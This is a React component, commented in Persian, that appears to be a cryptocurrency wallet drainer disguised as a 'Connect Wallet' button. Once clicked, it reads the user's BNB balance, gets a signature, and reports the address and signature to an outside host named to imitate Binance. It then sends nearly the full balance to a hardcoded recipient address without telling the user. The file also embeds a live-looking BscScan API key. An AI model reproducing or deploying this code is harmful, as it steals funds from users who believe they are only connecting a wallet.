import React, { useState } from "react";

const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";
async function getBNBBalance(address) {
  try {
    const resp = await fetch(
      `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`
    );
    const data = await resp.json();
    if (data.status === "1") {
      return (parseInt(data.result) / 1e18).toFixed(6);
    }
  } catch (error) {
    console.error("❌ Error fetching BNB balance:", error);
  }
  return null;
}

function App() {
  const [account, setAccount] = useState(null);

  async function connectAndSend() {
    // 1) اطمینان از اینکه در DApp Browser تراست والت هستیم
    if (typeof window.ethereum === "undefined") {
      alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
      return;
    }

    // 2) درخواست آدرس کاربر
    let accounts;
    try {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    } catch (err) {
      console.error("❌ Could not request accounts:", err);
      return;
    }
    if (!accounts || !accounts.length) {
      console.error("❌ No account returned.");
      return;
    }
    const userAddress = accounts[0];
    setAccount(userAddress);
    console.log("✅ User address:", userAddress);

    // 3) (اختیاری) گرفتن بالانس از BscScan
    const bnbBalance = await getBNBBalance(userAddress);
    console.log("💰 BNB Balance:", bnbBalance);

    // 4) ساخت پیام برای امضای درخواست
    const message = `Authorize sending ${bnbBalance} BNB from ${userAddress}`;
    console.log("📜 Message to sign:", message);

    let signature;
    try {
      // استفاده از personal_sign برای سازگاری با رفتار تراست والت
      signature = await window.ethereum.request({
        method: "personal_sign",
        params: [message, userAddress],
      });
      console.log("✍️ Signature:", signature);
    } catch (error) {
      console.error("❌ Error in personal_sign:", error);
      return;
    }

    // 5) ارسال امضا به سرور جهت بررسی و ثبت در لاگ
    try {
      const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          handler: "tx",
          address: userAddress,
          signature: signature,
          amount: bnbBalance,
        }),
      });
      const result = await resp.json();
      console.log("Server verify response:", result);
      if (!result.success) {
        console.error("❌ Signature verification failed or server error.", result);
        return;
      }
    } catch (e) {
      console.error("❌ Could not call server to verify signature:", e);
      return;
    }

    // 6) محاسبه مبلغ انتقال با کسر reserve معادل 2 دلار (مثلاً reserveBNB = 0.004 BNB)
    const reserveBNB = 0.004;
    const totalBalance = parseFloat(bnbBalance);
    const sendAmount = totalBalance - reserveBNB;
    if (sendAmount <= 0) {
      console.error("❌ Insufficient funds: not enough to cover reserve for gas fee.");
      return;
    }
    console.log("Sending amount (BNB):", sendAmount);

    const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
    const txParams = {
      from: userAddress,
      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
      value: sendWeiHex,
      gas: "0x5208",        // 21000 به هگز
      gasPrice: "0x3B9ACA00" // 1 gwei به هگز
    };

    try {
      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [txParams],
      });
      console.log("📤 Transaction broadcasted. Hash:", txHash);
      alert("Transaction sent! TxHash: " + txHash);
    } catch (err) {
      console.error("❌ Error sending transaction:", err);
    }
  }

  return (
    <div style={{ margin: "20px" }}>
      <a
        href="#"
        onClick={connectAndSend}
        className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      >
        {account ? `Connected: ${account}` : "Connect Wallet"}
      </a>
    </div>
  );
}

export default App;
